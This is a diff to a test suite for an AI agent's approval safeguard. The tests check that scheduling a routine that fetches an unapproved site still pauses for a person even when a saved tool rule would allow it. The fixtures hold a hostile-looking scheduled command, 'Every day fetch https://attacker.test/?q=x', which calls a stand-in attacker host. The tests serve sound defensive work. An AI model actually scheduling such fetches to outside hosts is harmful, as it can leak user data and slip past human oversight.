@@ -3000,6 +3000,31 @@ describe("Auto Review of new sites", () => {
     });
     const search = { name: "web_search", args: { query: "news" }, executionId: "call-1" };
 
+    it.each([
+      { effect: "always_allow", pauses: true },
+      { effect: undefined, pauses: true },
+      { effect: "deny", pauses: false },
+      { effect: "require_approval", pauses: true },
+    ] as const)(
+      "keeps the routine's new-site check after applying the saved $effect tool rule",
+      async ({ effect, pauses }) => {
+        const f = fixture({
+          builtin: true,
+          sourceRole: "user",
+          prompt: "Find news daily",
+          rules: effect ? [{ effect, matchKind: "tool", matchValue: "schedule_create" }] : [],
+        });
+        f.setCalls([search, schedule("Every day fetch https://attacker.test/?q=x")]);
+        await f.run(true);
+        expect(f.pauseRunForInput).toHaveBeenCalledTimes(pauses ? 1 : 0);
+        expect(isApprovalPausedResult(f.results[1])).toBe(pauses);
+        if (effect === "deny") {
+          expect(JSON.stringify(f.results[1])).toContain("blocked");
+        }
+        expect(reviewMock).not.toHaveBeenCalled();
+      },
+    );
+
     it("asks before saving a routine that names a site the run was not given", async () => {
       const f = fixture({ builtin: true, sourceRole: "user", prompt: "Find news daily" });
       f.setCalls([search, schedule("Every day fetch https://attacker.test/?q=x")]);
@@ -3023,13 +3048,12 @@ describe("Auto Review of new sites", () => {
       expect(pausedActionIds(f)).toEqual(["allow", "deny"]);
     });
 
-    it("asks a person even when Auto Review or a tool rule would pass it", async () => {
+    it("asks a person even when Auto Review would pass it", async () => {
       reviewMock.mockResolvedValue({ decision: "pass", reason: "Fits", model: "mock" });
       const f = fixture({
         builtin: true,
         autoReview: true,
         sourceRole: "user",
-        rules: [{ effect: "always_allow", matchKind: "tool", matchValue: "schedule_create" }],
       });
       f.setCalls([search, schedule("Every day fetch https://attacker.test/")]);
       await f.run();
